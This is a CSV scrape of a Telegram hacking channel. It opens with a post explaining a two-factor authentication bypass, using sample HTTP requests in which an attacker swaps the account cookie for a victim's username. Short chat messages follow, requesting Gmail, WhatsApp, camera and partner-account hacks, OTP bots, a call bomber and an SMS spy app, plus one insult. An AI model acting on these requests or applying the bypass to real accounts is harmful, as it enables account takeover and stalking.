id,Channel ID,URL,message,date,views,forwards,reactions
259,onlinehackingx,https://t.me/onlinehackingx,"⚠️ 2FA BYPASS ⚠️

Bypassing two-factor authentication

[] Flawed two-factor verification logic Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step For example, the user logs in with their normal credentials in the first step as follows:

POST /login-steps/first HTTP/1.1
Host: vulnerable-website.cam
...
username<PERSON>They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:

HTTP/1.1 200 OK
Set-Cookie: account-carlos

GET /login-steps/second HTTP/1.1
Cookie: account-carlos


When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:

POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account-carlos
...
verification-code=123456


In this case, an attacker could log in using their own credentials but then change the value of the account cookie to any arbitrary username when submitting the verification code.

POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account-victim-user
...
verification-code=123456


<PERSON>❤️  Telegram Channel - @OnlineHackingX 🏮
<PERSON>",2024-01-08T15:50:44+00:00,57978.0,100.0,"👍: 95, ❤: 16, 🔥: 12, 😱: 11, 😨: 7, 🥰: 5, 🤔: 5, 😁: 3, 😈: 1"
229907,onlinehackingx,https://t.me/onlinehackingx,🙂<PERSON>,2024-02-29T06:19:32+00:00,,,
213367,onlinehackingx,https://t.me/onlinehackingx,I can help u,2024-02-06T16:28:34+00:00,,,
213359,onlinehackingx,https://t.me/onlinehackingx,Anybody help me plz my ac.. Hacked,2024-02-06T15:56:36+00:00,,,
187909,onlinehackingx,https://t.me/onlinehackingx,Lodu tera pura khandan ka data <PERSON>,2024-01-14T20:35:21+00:00,,,
187155,onlinehackingx,https://t.me/onlinehackingx,@OnlineHackingX_Bot it's makes <DATE_TIME> that you said the bots will be back to work please.,2024-01-14T11:30:21+00:00,,,
186048,onlinehackingx,https://t.me/onlinehackingx,Hai,2024-01-13T14:20:59+00:00,,,
180469,onlinehackingx,https://t.me/onlinehackingx,How I can help,2024-01-10T12:58:54+00:00,,,
180468,onlinehackingx,https://t.me/onlinehackingx,WHITE HACKER... OF CYBER STUDENT👩‍🎓,2024-01-10T12:58:31+00:00,,,
180467,onlinehackingx,https://t.me/onlinehackingx,Hii,2024-01-10T12:58:05+00:00,,,
180149,onlinehackingx,https://t.me/onlinehackingx,Camra hacker need,2024-01-10T06:46:19+00:00,,,👍: 1
179352,onlinehackingx,https://t.me/onlinehackingx,UFFF🤦‍<NRP>,2024-01-09T15:28:51+00:00,,,👍: 1
179247,onlinehackingx,https://t.me/onlinehackingx,please help,2024-01-09T15:01:26+00:00,,,
179246,onlinehackingx,https://t.me/onlinehackingx,gmail hack <PERSON> hy,2024-01-09T15:01:07+00:00,,,
179115,onlinehackingx,https://t.me/onlinehackingx,0ba,2024-01-09T14:11:34+00:00,,,
179113,onlinehackingx,https://t.me/onlinehackingx,Hi there! 😊,2024-01-09T14:10:39+00:00,,,
179112,onlinehackingx,https://t.me/onlinehackingx,Hello,2024-01-09T14:10:38+00:00,,,
179111,onlinehackingx,https://t.me/onlinehackingx,Darun,2024-01-09T14:10:33+00:00,,,
179110,onlinehackingx,https://t.me/onlinehackingx,LP p,2024-01-09T14:10:26+00:00,,,
178971,onlinehackingx,https://t.me/onlinehackingx,Post wali,2024-01-09T13:14:04+00:00,,,
178726,onlinehackingx,https://t.me/onlinehackingx,Call bomber php bro do,2024-01-09T10:42:29+00:00,,,👍: 1
178224,onlinehackingx,https://t.me/onlinehackingx,Google Gmail,2024-01-09T07:36:53+00:00,,,
178223,onlinehackingx,https://t.me/onlinehackingx,Does this work on gmail verification,2024-01-09T07:36:41+00:00,,,
178044,onlinehackingx,https://t.me/onlinehackingx,Ya web <PERSON>,2024-01-09T07:01:02+00:00,,,
177749,onlinehackingx,https://t.me/onlinehackingx,What is this,2024-01-09T02:48:46+00:00,,,
177748,onlinehackingx,https://t.me/onlinehackingx,Use a payload,2024-01-09T02:48:14+00:00,,,
177747,onlinehackingx,https://t.me/onlinehackingx,Of which platform?,2024-01-09T02:47:54+00:00,,,
177746,onlinehackingx,https://t.me/onlinehackingx,Phone hack <PERSON>,2024-01-09T02:47:50+00:00,,,
177738,onlinehackingx,https://t.me/onlinehackingx,I have. But i want to use 2fa in mobile,2024-01-09T02:19:01+00:00,,,
177737,onlinehackingx,https://t.me/onlinehackingx,Its need pc...,2024-01-09T02:18:43+00:00,,,
177736,onlinehackingx,https://t.me/onlinehackingx,But I don't have pc,2024-01-09T02:17:28+00:00,,,
177734,onlinehackingx,https://t.me/onlinehackingx,Ok I will,2024-01-09T02:17:00+00:00,,,
177733,onlinehackingx,https://t.me/onlinehackingx,Any one please teach me how to use thi 2fa,2024-01-09T02:15:37+00:00,,,
177728,onlinehackingx,https://t.me/onlinehackingx,Best way of bypass 2fa is attacking through API and response manipulation techniques,2024-01-09T02:00:19+00:00,,,
177726,onlinehackingx,https://t.me/onlinehackingx,Only an incompetent kid will make that kind of mistake.,2024-01-09T01:39:48+00:00,,,
177720,onlinehackingx,https://t.me/onlinehackingx,.,2024-01-08T22:36:26+00:00,,,
177633,onlinehackingx,https://t.me/onlinehackingx,<PERSON> he ye,2024-01-08T20:43:18+00:00,,,
177632,onlinehackingx,https://t.me/onlinehackingx,I want my gf WhatsApp account,2024-01-08T20:18:05+00:00,,,
177203,onlinehackingx,https://t.me/onlinehackingx,I want WhatsApp fake account,2024-01-08T17:43:20+00:00,,,
177181,onlinehackingx,https://t.me/onlinehackingx,Can you give example in video step by step,2024-01-08T17:37:37+00:00,,,
177142,onlinehackingx,https://t.me/onlinehackingx,Bro not working properly,2024-01-08T17:33:19+00:00,,,
177087,onlinehackingx,https://t.me/onlinehackingx,Mein 100 <PERSON>,2024-01-08T17:25:50+00:00,,,
177086,onlinehackingx,https://t.me/onlinehackingx,Bro SmsSpy Hide apk bana <PERSON>,2024-01-08T17:25:30+00:00,,,
177076,onlinehackingx,https://t.me/onlinehackingx,Hey! 😉,2024-01-08T17:24:09+00:00,,,
177075,onlinehackingx,https://t.me/onlinehackingx,Hello sumon bro plz reply me,2024-01-08T17:24:08+00:00,,,
177008,onlinehackingx,https://t.me/onlinehackingx,Can u give example of this 2FA with <PERSON> please,2024-01-08T17:06:08+00:00,,,
176985,onlinehackingx,https://t.me/onlinehackingx,Come,2024-01-08T16:57:25+00:00,,,
176984,onlinehackingx,https://t.me/onlinehackingx,Hello! 😅,2024-01-08T16:56:38+00:00,,,
176983,onlinehackingx,https://t.me/onlinehackingx,"Hello hacker, do I need to learn http protocol?",2024-01-08T16:56:37+00:00,,,
176906,onlinehackingx,https://t.me/onlinehackingx,Anyone with OTP bot to bypass 2fa?,2024-01-08T16:21:13+00:00,,,
176851,onlinehackingx,https://t.me/onlinehackingx,<PERSON>,2024-01-08T16:04:04+00:00,,,
176837,onlinehackingx,https://t.me/onlinehackingx,😭😶😔,2024-01-08T15:58:41+00:00,,,
176835,onlinehackingx,https://t.me/onlinehackingx,@OnlineHackingX_Bot Please arrange for a copy,2024-01-08T15:57:09+00:00,,,
176833,onlinehackingx,https://t.me/onlinehackingx,"Where?
🙄",2024-01-08T15:56:40+00:00,,,
176827,onlinehackingx,https://t.me/onlinehackingx,@OnlineHackingX_Bot I Can't copy it😭😭,2024-01-08T15:55:47+00:00,,,
176825,onlinehackingx,https://t.me/onlinehackingx,"So when I can use this bot?
Approximate date plz",2024-01-08T15:55:33+00:00,,,
176823,onlinehackingx,https://t.me/onlinehackingx,I Can't copy it😭😭,2024-01-08T15:55:16+00:00,,,👍: 1
176815,onlinehackingx,https://t.me/onlinehackingx,Why?,2024-01-08T15:54:13+00:00,,,
176807,onlinehackingx,https://t.me/onlinehackingx,Camera hacking bot Isn't working,2024-01-08T15:52:24+00:00,,,
